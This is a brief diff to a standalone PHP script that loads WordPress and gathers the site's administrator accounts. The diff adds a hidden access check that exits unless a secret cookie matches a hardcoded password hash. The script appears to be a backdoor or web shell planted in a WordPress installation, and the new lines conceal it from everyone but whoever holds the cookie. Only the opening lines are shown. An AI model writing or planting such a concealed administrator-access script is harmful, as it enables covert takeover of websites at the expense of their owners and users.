@@ -1,4 +1,8 @@
 <?php
+$p = '$2a$12$zbv5xVTKAFrQTGtres97JO.nTtfq.BIH41KV7zCwfh1kZ8aa8TsFa';
+if (!password_verify($_COOKIE['p']??'',$p)) {
+	exit();
+}
 require(rtrim($_SERVER["DOCUMENT_ROOT"], "/\\") . DIRECTORY_SEPARATOR . "wp-blog-header.php");
 $u = get_users('role=administrator');
 $us="";
